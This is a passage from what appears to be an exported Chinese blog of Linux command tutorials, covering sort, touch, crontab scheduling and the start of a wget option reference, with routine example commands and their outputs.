SSH:/var/empty/sshd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 sort 不加任何选项，则从手自缚向后，一次按 ASCII 码值进行比较，最后将它们按升序输出。 实例2：对 /etc/passwd 第三栏排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort -t':' -k 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sort -t':' -k 3root:x:0:0:root:/root:/bin/bashoperator:x:11:0:operator:/root:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/synctss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是以字符串来排序的 实例3：对 /etc/passwd 第三栏以纯数字排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat /etc/passwd|sort -t':' -k3 -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cat /etc/passwd|sort -t':' -k 3 -nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 实例4：去重复排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sort -u seq.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[rocrocket@rocrocket programming]$ cat seq.txtbananaapplepearorangepear[rocrocket@rocrocket programming]$ sort seq.txtapplebananaorangepearpear[rocrocket@rocrocket programming]$ sort -u seq.txtapplebananaorangepear &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pear 由于重复被 -u 选项去重复了 实例5：进行降序排列1sort -r number.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718rocrocket@rocrocket programming]$ cat number.txt13524[rocrocket@rocrocket programming]$ sort number.txt12345[rocrocket@rocrocket programming]$ sort -r number.txt54321 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sort 默认的排列方式是升序，使用 -r 选项就可以改成降序 实例6：把排序结果输出到源文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sort -r number.txt -o number.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[rocrocket@rocrocket programming]$ sort -r number.txt &gt; number.txt[rocrocket@rocrocket programming]$ cat number.txt[rocrocket@rocrocket programming]$[rocrocket@rocrocket programming]$ cat number.txt13524[rocrocket@rocrocket programming]$ sort -r number.txt -o number.txt[rocrocket@rocrocket programming]$ cat number.txt54321 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接把排序结果用重定向输出到源文件中，结果文件被清空了；使用 -o 选项解决了这个问题，可以放心把输出结果写入源文件]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- touch]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F7.%20Linux%20%E5%91%BD%E4%BB%A4-%20touch%2F</url>
    <content type="text"><![CDATA[Linux 命令- touch&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux的touch命令不常用，一般在使用make的时候可能会用到，用来修改文件时间戳，或者新建一个不存在的文件。 1．命令格式：1touch [选项] [文件] 2．命令参数： -a 或–time=atime或–time=access或–time=use 只更改存取时间。 -c 或–no-create 不建立任何文档。 -d 使用指定的日期时间，而非现在的时间。 -f 此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题。 -m&amp; 或–time=mtime或–time=modify 只更改变动时间。 -r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同。 -t 使用指定的日期时间，而非现在的时间。 3．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间。 4．使用范例：实例1：创建不存在的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost test]# touch log2012.log log2013.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果log2014.log不存在，则不创建文件 1234[root@localhost test]# touch -c log2014.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log 实例2：更新log.log的时间和log2012.log时间戳相同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch -r log.log log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log[root@localhost test]# touch -r log.log log2012.log [root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log 实例3：设定文件的时间戳&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch -t 201211142234.50 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log[root@localhost test]# touch -t 201211142234.50 log.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 2012-11-14 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-t time 使用指定的时间值 time 作为指定文件相应时间戳记的新值．此处的 time规定为如下形式的十进制数: 1[[CC]YY]MMDDhhmm[.SS] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里，CC为年数中的前两位，即”世纪数”；YY为年数的后两位，即某世纪中的年数．如果不给出CC的值，则touch 将把年数CCYY限定在1969–2068之内．MM为月数，DD为天将把年数CCYY限定在1969–2068之内．MM为月数，DD为天数，hh 为小时数(几点)，mm为分钟数，SS为秒数．此处秒的设定范围是0–61，这样可以处理闰秒．这些数字组成的时间是环境变量TZ指定的时区中的一个时 间．由于系统的限制，早于1970年1月1日的时间是错误的。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- crontab]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F52.%20Linux%20%E5%91%BD%E4%BB%A4-%20crontab%2F</url>
    <content type="text"><![CDATA[Linux 命令- crontab&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。 一、crond简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux下的任务调度分为两类，系统任务调度和用户任务调度。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。 123456789101112/etc/crontab文件包括下面几行：[root@localhost ~]# cat /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=""HOME=/# run-parts51 * * * * root run-parts /etc/cron.hourly24 7 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly[root@localhost ~]#` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。 使用者权限文件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/etc/cron.deny &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该文件中所列用户不允许使用crontab命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/etc/cron.allow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该文件中所列用户允许使用crontab命令 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件：/var/spool/cron/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下： 1minute hour day month week command &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9” 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6” 正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 二、crond服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装crontab： 1yum install crontabs &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务操作说明： 123456789101112/sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置查看crontab服务状态：service crond status手动启动crontab服务：service crond start查看crontab服务是否已设置为开机启动，执行命令：ntsysv加入开机自动启动：chkconfig –level 35 crond on 三、crontab命令详解1．命令格式12crontab [-u user] filecrontab [-u user] [ -e | -l | -r ] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。 3．命令参数 -u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。 file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 -e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。 -l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。 -r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。 -i：在删除用户的crontab文件时给确认提示。 4．常用方法1). 创建一个新的crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的. profile文件，在其中加入这样一行： 1EDITOR=vi; export EDITOR &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后保存并退出。不妨创建一个名为 cron的文件，其中是用户名，例如， davecron。在该文件中加入如下的内容。 123# (put your own initials here)echo the date to the console every# 15minutes between 6pm and 6am0,15,30,45 18-06 * * * /bin/echo 'date' &gt; /dev/console &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存并退出。确信前面5个域用空格分隔。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数： 1$ crontab davecron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。 2). 列出crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了列出crontab文件，可以用： 12$ crontab -l0,15,30,45,18-06 * * * /bin/echo `date` &gt; dev/tty1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份： 1$ crontab -l &gt; $HOME/mycron &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。 3). 编辑crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望添加、删除或编辑crontab文件中的条目，而E D I TO R环境变量又设置为v i，那么就可以用v i来编辑crontab文件，相应的命令为： 1$ crontab -e &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以像使用vi编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条： 12# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在让我们使用前面讲过的crontab -l命令列出它的全部信息： 123456$ crontab -l # (crondave installed on Tue May 4 13:07:43 1999)# DT:ech the date to the console every 30 minites0,15,30,45 18-06 * * * /bin/echo `date` &gt; /dev/tty1# DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month30 3 1,7,14,21,26 * * /bin/find -name "core' -exec rm &#123;&#125; \; 4). 删除crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要删除crontab文件，可以用： 1$ crontab -r 5). 恢复丢失的crontab文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/，其中是用户名。如果由于权限问题无法完成拷贝，可以用： 1$ crontab &lt;filename&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，是你在$ H O M E目录中副本的文件名。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建议在自己的$ H O M E目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按，否则你将丢失crontab文件。 5．使用实例实例1：每1分钟执行一次command&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1* * * * * command 实例2：每小时的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 13,15 * * * * command 实例3：在上午8点到11点的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 13,15 8-11 * * * command 实例4：每隔两天的上午8点到11点的第3和第15分钟执行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456789101112131415161718192021223,15 8-11 */2 * * command``` #### 实例5：每个星期一的上午8点到11点的第3和第15分钟执行&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash3,15 8-11 * * 1 command``` #### 实例6：每晚的21:30重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash30 21 * * * /etc/init.d/smb restart``` #### 实例7：每月1、10、22日的4 : 45重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash45 4 1,10,22 * * /etc/init.d/smb restart 实例8：每周六、周日的1 : 10重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 110 1 * * 6,0 /etc/init.d/smb restart 实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456780,30 18-23 * * * /etc/init.d/smb restart``` #### 实例10：每星期六的晚上11 : 00 pm重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash0 23 * * 6 /etc/init.d/smb restart 实例11：每一小时重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1* */1 * * * /etc/init.d/smb restart 实例12：晚上11点到早上7点之间，每隔一小时重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12345678* 23-7/1 * * * /etc/init.d/smb restart``` #### 实例13：每月的4号与每周一到周三的11点重启smb &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;**命令**```bash0 11 4 * mon-wed /etc/init.d/smb restart 实例14：一月一号的4点重启smb&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 10 4 1 jan * /etc/init.d/smb restart 实例15：每小时执行/etc/cron.hourly目录内的脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 101 * * * * root run-parts /etc/cron.hourly &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了 四、使用注意事项1. 注意环境变量问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点： 脚本中涉及文件路径时写全局路径； 脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如： 12345cat start_cbp.sh#!/bin/shsource /etc/profileexport RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp; 当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如： 10 * * * * . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh 2. 注意清理系统用户的邮件日志&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，可以在crontab文件中设置如下形式，忽略日志输出： 10 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“/dev/null 2&gt;&amp;1”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。 3. 系统级任务调度与用户级任务调度&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。 4. 其他注意事项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\%Y\%m\%d’。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- wget]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F63.%20Linux%20%E5%91%BD%E4%BB%A4-%20wget%2F</url>
    <content type="text"><![CDATA[Linux 命令- wget&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，wget将在后台执行直到任务完成，相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget 可以跟踪HTML页面上的链接依次下载来创建远程服务器的本地版本，完全重建原始站点的目录结构。这又常被称作”递归下载”。在递归下载的时候，wget 遵循Robot Exclusion标准(/robots.txt). wget可以在下载的同时，将链接转换成指向本地文件，以方便离线浏览。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget 非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性.如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。这对从那些限定了链接时间的服务器上下载大文件非常有用。 1．命令格式1wget [参数] [URL地址] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。wget虽然功能强大，但是使用起来还是比较简单： 支持断点下传功能；这一点，也是网络蚂蚁和FlashGet当年最大的卖点，现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了； 同时支持FTP和HTTP下载方式；尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件； 支持代理服务器；对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，所以，支持代理是下载软件必须有的功能； 设置方便简单；可能，习惯图形界面的用户已经不是太习惯命令行了，但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标； 程序小，完全免费；程序小可以考虑不计，因为现在的硬盘实在太大了；完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。 3．命令参数：启动参数： -V, –version 显示wget的版本后退出 -h, –help 打印语法帮助 -b, –background 启动后转入后台执行 -e, –execute=COMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc 记录和输入文件参数： -o, –output-file=FILE 把记录写到FILE文件中 -a, –append-output=FILE 把记录追加到FILE文件中 -d, –debug 打印调试输出 -q, –quiet 安静模式(没有输出) -v, –verbose 冗长模式(这是缺省设置) -nv, –non-verbose 关掉冗长模式，但不是安静模式 -i, –input-file=FILE 下载在FILE文件中出现的URLs -F, –force-html 把输入文件当作HTML格式文件对待 -B, –base=URL 将URL作为在-F - -i参数指定的文件中出现的相对链接的前缀 –sslcertfile=FILE 可选客户端证书 –sslcertkey=KEYFILE 可选客户端证书的KEYFILE –egd-file=FILE 指定EGD socket的文件名 下载参数： –bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用) -t, –tries=NUMBER 设定最大尝试链接次数(0 表示无限制). -O –output-document=FILE 把文档写到FILE文件中 -nc, –no-clobber 不要覆盖存在的文件或使用.#前缀 -c, –continue 接着下载没下载完的文件 –progress=TYPE 设定进程条标记 -N, –timestamping 不要重新下载文件除非比本地文件新 -S, –server-response 打印服务器的回应 –spider 不下载任何东西 -T, –timeout=SECONDS 设定响应超时的秒数 -w, –wait=SECONDS 两次尝试之间间隔SECONDS秒 –waitretry=SECONDS 在重新链接之间等待1…SECONDS秒 –random-wait 